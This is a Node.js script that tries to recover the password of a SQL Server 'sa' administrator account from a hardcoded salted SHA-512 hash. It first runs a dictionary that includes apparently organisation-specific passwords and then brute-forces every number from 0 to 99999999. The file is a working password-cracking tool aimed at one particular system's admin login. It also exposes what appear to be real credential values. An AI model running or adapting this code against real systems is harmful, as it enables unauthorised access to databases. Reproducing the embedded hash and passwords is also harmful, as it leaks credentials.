import crypto from 'node:crypto';

// sa hash: 0200 F677182C A77A721E...
const salt = Buffer.from('F677182C', 'hex');
const targetHash = 'a77a721e73fad939ef199ba56ff15d3ff0235dede81eb8c980f50a9fdc48d1c1f58281d0df59fc4f692d4049f0f5c178ec0d60d224dac59e192bdda960ca8027';

function test(pwd) {
  const buf = Buffer.from(pwd, 'utf16le');
  return crypto.createHash('sha512').update(Buffer.concat([buf, salt])).digest('hex') === targetHash;
}

// Dictionary
const dict = [
  'admin','Admin','ADMIN','administrator','Administrator','ADMINISTRATOR',
  '123','1234','12345','123456','1234567','12345678','123456789','1234567890',
  '11225511','password','Password','P@ssw0rd','P@ssword1',
  'sa','SA','Sa','system','System','SYSTEM','ecas','ECAS','Ecas',
  'Ecas@123','ECAS@123','ecas@123','Ecas@2014','ecas2014','Ecas2014',
  'Asd@123','zuc2673','zuc2668','mypassword4lonin','zuakha033','nullandnotempty',
  'Admin@206','Ymax@123','YemenID@555','AlhamRead@2026!','almham2026',
  'Kamaran24','Alnajmpower11','LitYidSMS@123','LitN3wYnet_123','Ecas@9982.zuc',
  'abc123','qwerty','letmein','master','dragon','root','test','guest','user',
  'Sql2014','SQL2014','Power@2014','sa123','Sa@123','sa@123','SA@123',
  'Passw0rd','Welcome1','Changeme1','ATWAAlregam@123321','Almham@2026',
  'H2-Power','Ma3berPwr','PowerMetYm2','Litwin11','S180718b',
];

console.log(`Testing ${dict.length} words...`);
for (const pwd of dict) {
  if (test(pwd)) { console.log(`🚨🚨🚨 sa = "${pwd}"`); process.exit(0); }
}

// Brute: 0-99999999
console.log('Brute force 0-99999999...');
for (let n = 0; n <= 99999999; n++) {
  if (test(String(n))) { console.log(`\n🚨🚨🚨 sa = "${n}"`); process.exit(0); }
  if (n % 5000000 === 0 && n > 0) process.stdout.write(`${n/1000000}M `);
}

console.log('\n❌ Not found');
